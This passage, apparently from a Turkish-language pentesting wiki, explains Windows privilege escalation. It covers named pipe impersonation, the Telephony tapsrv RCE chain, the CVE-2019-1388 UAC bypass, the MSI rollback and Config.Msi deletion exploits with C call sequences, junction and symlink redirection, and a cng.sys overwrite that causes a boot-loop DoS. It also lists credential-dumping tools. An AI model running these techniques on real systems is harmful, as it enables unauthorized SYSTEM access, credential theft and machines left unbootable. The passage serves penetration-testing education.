Windows, ilgisiz süreçlerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rolleri **named pipe server** ve **named pipe client** olarak tanımlanan bir istemci/sunucu mimarisine benzer.

Bir **istemci** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **sunucu**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **istemcinin kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir süreci** belirlemek, kurduğunuz pipe ile etkileşime girdiğinde o sürecin kimliğini benimseyerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Böyle bir saldırının nasıl gerçekleştirileceğine dair yönergeler için [**buraya**](named-pipe-client-impersonation.md) ve [**buraya**](#from-high-integrity-to-system) bakabilirsiniz.

Ayrıca aşağıdaki araç, **burp gibi bir araçla named pipe iletişimini engellemeyi** sağlar: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept). **Bu araç ise privescs bulmak için tüm pipe'ları listelemeyi ve görüntülemeyi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv ile uzaktan DWORD yazma yoluyla RCE

Sunucu modundaki Telephony hizmeti (TapiSrv), `\\pipe\\tapsrv`'yi (MS-TRP) kullanıma açar. Uzaktan kimliği doğrulanmış bir istemci, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach`'i, `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya yönelik rastgele **4 baytlık bir yazma** işlemine dönüştürebilir; ardından Telephony admin haklarını elde edip hizmet olarak rastgele bir DLL yükleyebilir. İşleyişin tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir yol olarak ayarlayarak `ClientAttach` çağrısı yapın → hizmet, bu yolu `CreateFileW(..., OPEN_EXISTING)` ile açar ve async event yazma işlemleri için kullanır.
- Her event, `Initialize` içindeki saldırgan denetimindeki `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın, ardından deterministik yazma işlemlerini tekrarlamak için kaydı kaldırıp hizmeti kapatın.
- `C:\Windows\TAPI\tsec.ini` dosyasındaki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` işlevini yürütmek için rastgele bir DLL yolu içeren `GetUIDllName` çağrısı yapın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta bir şeyler çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown görüntüleyicileri üzerinden Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyerek mevcut kullanıcı olarak saldırgan denetimindeki dosyaları çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için komut satırlarını izleme**

Bir kullanıcı olarak shell aldığınızda, **kimlik bilgilerini komut satırında ileten** zamanlanmış görevler veya çalışan başka süreçler olabilir. Aşağıdaki betik, süreçlerin komut satırlarını her iki saniyede bir yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları görüntüler.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" olarak başka bir süreci çalıştırmak mümkündür.

Bu, aynı güvenlik açığıyla hem ayrıcalıkları yükseltmeyi hem de UAC'yi atlatmayı mümkün kılar. Ayrıca hiçbir şey yüklemeniz gerekmez ve işlem sırasında kullanılan ikili dosya Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları gerçekleştirmek gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosyalara ve bilgilere aşağıdaki GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels hakkında bilgi edinmek için bunu okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'ları hakkında bilgi edinmek için bunu okuyun:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Kök Dizine Upload Directory Junction'ları Ekleme

Bir uygulama, tahmin edilebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp bir NTFS junction ile değiştirebiliyorsa, yazma işlemi junction'ı izleyerek web üzerinden sunulan bir dizine gidebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web hizmeti kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; yazılabilir bir upload dizini veya mevcut bir junction tek başına bunu kanıtlamaz.

Upload handler'daki yol oluşturma ve zamanlamayı, kullanıcının alt dizindeki etkin silme/oluşturma izinlerini, hedefin etkin ACL'lerini, yazıcının reparse point'leri izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazıcının ve web sunucusunun süreç kimliklerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekte yapılacak bir junction değişikliğini kanıtlayamaz. Çalıştırma bir hizmet hesabı olarak gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ı** inceleyin.

## Herhangi Bir Klasörü Silme/Taşıma/Yeniden Adlandırma İzninden SYSTEM EoP'ye

[**Bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanan ve exploit kodu [**burada bulunan**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) teknik.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için temel olarak Windows Installer'ın rollback özelliğini kötüye kullanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir. Bu klasör daha sonra Windows Installer tarafından diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanılır; bu dosyalar, kötü amaçlı payload içerecek şekilde değiştirilmiş olur.

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) üzerinden SYSTEM `msiexec.exe` hizmetine erişebilir. Reverse engineering ile ilgili `IMsiServer` çağrılarının vtable offset'leri `MsiBeginTransactionW` için `0xA0`, `SetEEUIDirectoryAndFilter` için `0xC8` ve `CleanupTempPackages` için `0x50` olarak belirlendi. Bu adlar ve offset'ler reverse engineering ile elde edilmiştir ve build'ler arasında değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken yalnızca çağıran kullanıcıyı taklit eder. Bu, çağıranın dizini silebildiğini doğrular ve reparse point'in izlenmesini önler; ancak denetlenen file object'i sonraki cleanup işlemine bağlamaz veya dosyanın Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filter argümanından bağımsız olarak yolu klasör olarak zamanlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın denetimindeki yol, `0x00000002` verisi ise klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` cleanup işlemine doğrudan girer. Yükseltilmiş worker, registry değerlerini listeler ve klasör girdilerini yolun kaynağını denetlemeden recursive `FDeleteFolder` işlevine iletir. Normal silme başarısız olursa kod ayrıca `LockdownPath` işlevini çağırır, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından elde edilen en kısa çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi yerine path reuse'dur. Saldırganın oluşturduğu `C:\Config.Msi` dizinini kaydedin, silin ve Windows Installer'ın daha sonra aynı path'i korumalı rollback verileriyle yeniden oluşturmasını bekleyin. Temizlik işlemi eski `TempPackages` adına güvenir ve yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve redirection-trust mitigation ile amaçlanan sınırı aşar.<sup>[[41]](#references)</sup>

Bu silme primitive'i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL'yi sıkılaştırmadan önce `WRITE_DAC` yetkili bir handle alın. Önceden açılmış handle, `NtSetSecurityObject` ile izin verici bir DACL'yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` dosyası değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkinleştirildiğinde `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu path'i düzeltti. COM çağrısı yine de başarılı dönebilir, ancak saldırganın denetimindeki path artık `TempPackages` içine eklenmez. Yama testi olarak metodun başarılı dönüşünü kullanmak yerine Nisan 2025 Windows security updates güncellemelerini uygulayın.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` dizinini boş bırakın)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Yönetici olmayan bir kullanıcının** çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Yükleme sonrasında dosyaya ait bir **handle**'ı açık tutun.

- Adım 2: Kaldırma işlemini başlatın
    - Aynı `.msi` dosyasını kaldırın.
    - Kaldırma işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini tespit etmek için `GetFinalPathNameByHandle` kullanarak açık dosya handle'ını **poll edin**.

- Adım 3: Özel senkronizasyon
    - `.msi`, şu işlemleri yapan bir **özel kaldırma eylemi (`SyncOnRbfWritten`)** içerir:
        - `.rbf` yazıldığında sinyal verir.
        - Ardından kaldırma işlemine devam etmeden önce başka bir event üzerinde **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Sinyal geldiğinde `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, **dosyanın silinmesini engeller**.
    - Ardından kaldırma işleminin tamamlanabilmesi için geri sinyal verin.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - Siz (saldırgan) `.rbf` dosyasını elle silin.
    - Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada **`C:\Config.Msi` dizinini silmek için SYSTEM düzeyindeki arbitrary folder delete vulnerability'yi tetikleyin**.

2. **Aşama 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` yetkili bir handle'ı **açık tutun**.

- Adım 7: Başka bir yükleme çalıştırın
    - `.msi` dosyasını yeniden yükleyin ve şunları kullanın:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback öncesinde senkronizasyon yapın
    - `.msi`, şu işlemleri yapan bir **özel yükleme eylemi (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event'e sinyal verir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` event'ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` için **güçlü ACL'leri yeniden uygular**.
        - Ancak hâlâ `WRITE_DAC` yetkili bir handle'ınız olduğundan **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken denetlenir**, bu nedenle klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - `.rbs` dosyasının üzerine, Windows'a şunları söyleyen **sahte bir rollback script'i** yazın:
        - `.rbf` dosyanızı (kötü amaçlı DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini.
    - **SYSTEM düzeyinde kötü amaçlı bir payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback işlemini tetikleyin
    - Installer'ın devam etmesi için sync event'ine sinyal verin.
    - **Tür 19 özel eylemi (`ErrorOut`)**, yüklemeyi bilinen bir noktada **kasten başarısız kılacak** şekilde yapılandırılmıştır.
    - Böylece **rollback başlar**.

- Adım 13: SYSTEM DLL'nizi yükler
    - Windows Installer:
        - Kötü amaçlı `.rbs` dosyanızı okur.
        - `.rbf` DLL'nizi hedef konuma kopyalar.
    - Böylece **SYSTEM tarafından yüklenen bir path'te** kötü amaçlı DLL'niz olur.

- Son Adım: SYSTEM kodunu çalıştırın
    - Hijack ettiğiniz DLL'yi yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
    - **Boom**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (önceki teknik), **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya açığınız yalnızca **arbitrary file deletion** olanağı sağlıyorsa?

**NTFS internals**'ı istismar edebilirsiniz: her klasörde şu adlı gizli bir alternate data stream bulunur:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **index metadata** bilgisini depolar.

Dolayısıyla, bir klasörün `::$INDEX_ALLOCATION` stream'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu şu standart file deletion API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API çağırıyor olsanız bile, **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize **izin veriyorsa** ne olur?

1. Adım 1: Yem klasörü ve dosya oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu oluşturun: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerine bir **oplock** koyun
- Ayrıcalıklı bir process `file1.txt` dosyasını silmeye çalıştığında oplock **yürütmeyi duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM process'i tetikleyin (örn. `SilentCleanup`)
- Bu process klasörleri (örn. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback içinde — silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'i bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'in zamanından önce serbest bırakılmasına neden olur.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör metadata'sını depolayan NTFS iç akışını hedefler — bu akışı silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırakın
- SYSTEM süreci devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak artık junction + symlink nedeniyle, aslında sildiği şey şudur:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### Rastgele Klasör Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak rastgele bir klasör oluşturmanı** sağlayan bir primitive'den yararlan — **dosya yazamasan** veya **zayıf izinler ayarlayamasan** bile.

**Kritik bir Windows driver'ının** adını taşıyan bir **klasör** (dosya değil) oluştur, örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden bir klasör olarak oluşturursanız**, Windows önyükleme sırasında gerçek driver'ı yükleyemez.
- Ardından Windows, önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümleyemez** ve **çöker veya önyüklemeyi durdurur**.
- **Fallback yoktur** ve harici müdahale (ör. boot repair veya disk erişimi) olmadan **kurtarma mümkün değildir**.

### Ayrıcalıklı log/backup yollarından ve OM symlink'lerinden rastgele dosya üzerine yazma / boot DoS'a

Bir **ayrıcalıklı servis**, **yazılabilir bir config** dosyasından okuduğu bir yola log/export yazdığında, **SeCreateSymbolicLinkPrivilege olmadan bile** ayrıcalıklı yazma işlemini rastgele dosya üzerine yazmaya dönüştürmek için bu yolu **Object Manager symlink'leri + NTFS mount point'leri** ile yönlendirin.<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu tutan config dosyası saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` konumuna mount point ve OM file symlink oluşturma yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek zincir**
1. Ayrıcalıklı log hedefini belirlemek için config dosyasını okuyun; ör. `C:\ProgramData\ICONICS\IcoSetup64.ini` içindeki `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`.
2. Admin olmadan yolu yönlendirin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. yönetici "send test SMS" işlemini tetikler). Yazma işlemi artık `C:\Windows\System32\cng.sys` dosyasına yapılır.
4. Bozulmayı doğrulamak için üzerine yazılan hedefi inceleyin (hex/PE parser); yeniden başlatma, Windows'un kurcalanmış driver yolunu yüklemesini zorlar → **boot loop DoS**. Bu yöntem, ayrıcalıklı bir service'in yazma amacıyla açacağı korumalı herhangi bir dosyaya da uygulanabilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys` konumundan yüklenir; ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa, önce bu kopya denenebilir ve böylece bozuk veriler için güvenilir bir DoS hedefi hâline gelir.



## **High Integrity'den System'e**

### **Yeni service**

Zaten bir High Integrity process içinde çalışıyorsanız, **SYSTEM'e giden yol** yalnızca yeni bir service **oluşturup çalıştırarak** kolayca açılabilir:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Bir service binary oluştururken bunun geçerli bir service olduğundan veya gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılır.

### AlwaysInstallElevated

High Integrity bir süreçten **AlwaysInstallElevated registry girdilerini etkinleştirmeyi** ve bir reverse shell'i _**.msi**_ wrapper kullanarak **yüklemeyi** deneyebilirsiniz.\
[İlgili registry anahtarları ve bir _.msi_ paketinin nasıl yükleneceği hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate ayrıcalığından System'e

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### SeDebug + SeImpersonate'ten Full Token ayrıcalıklarına

Bu token ayrıcalıklarına sahipseniz (bunu muhtemelen zaten High Integrity olan bir süreçte bulursunuz), SeDebug ayrıcalığıyla **neredeyse her süreci** (korumalı süreçler hariç) **açabilir**, sürecin token'ını **kopyalayabilir** ve bu token'la **rastgele bir süreç oluşturabilirsiniz**.\
Bu teknikle genellikle **tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir süreç seçilir** (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM süreçleri de bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir** [**kod örneğini burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik, meterpreter tarafından `getsystem` içinde ayrıcalık yükseltmek için kullanılır. Teknik, **bir pipe oluşturup ardından bu pipe'a yazması için bir service oluşturmayı/kötüye kullanmayı** içerir. Ardından pipe'ı **`SeImpersonate`** ayrıcalığıyla oluşturan **server**, pipe client'ının (service) token'ını **taklit ederek** SYSTEM ayrıcalıkları elde edebilir.\
[**Name pipe'lar hakkında daha fazla bilgi edinmek istiyorsanız bunu okuyun**](#named-pipe-client-impersonation).\
[**Name pipe'lar kullanarak High Integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız bunu okuyun**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

**SYSTEM** olarak çalışan bir **süreç** tarafından **yüklenen** bir dll'i **hijack** edebilirseniz, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür ayrıcalık yükseltme için de kullanışlıdır. Ayrıca, dll'lerin yüklenmesi için kullanılan klasörlerde **yazma izinleri** olacağından, **High Integrity bir süreçten gerçekleştirilmesi çok daha kolaydır**.\
**Dll hijacking hakkında daha fazla bilgiyi** [**burada bulabilirsiniz**](dll-hijacking/index.html)**.**

### **Administrator veya Network Service'ten System'e**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### LOCAL SERVICE veya NETWORK SERVICE'ten tam ayrıcalıklara

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Yararlı araçlar

**Windows yerel ayrıcalık yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edilir.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Yerel kullanımda -Thorough seçeneğini kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edilir.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde spray eder**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofing ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel Windows privesc enumerasyonu**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc açıklarını arar (Watson nedeniyle kullanımdan kaldırılmıştır)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin hakları gerekir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc açıklarını arar (VisualStudio kullanılarak derlenmesi gerekir) ([**önceden derlenmiş sürüm**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları aramak için host'u enumerate eder (privesc aracından çok bilgi toplama aracıdır) (derlenmesi gerekir) **(**[**önceden derlenmiş sürüm**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Pek çok yazılımdan kimlik bilgilerini çıkarır (GitHub'da önceden derlenmiş exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C#'a aktarılmış sürümü**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (GitHub'da önceden derlenmiş executable). Önerilmez. Win10'da iyi çalışmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (Python'dan exe). Önerilmez. Win10'da iyi çalışmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu yazı temel alınarak oluşturulmuş araç (düzgün çalışmak için accesschk gerektirmez, ancak kullanabilir).

**Local**

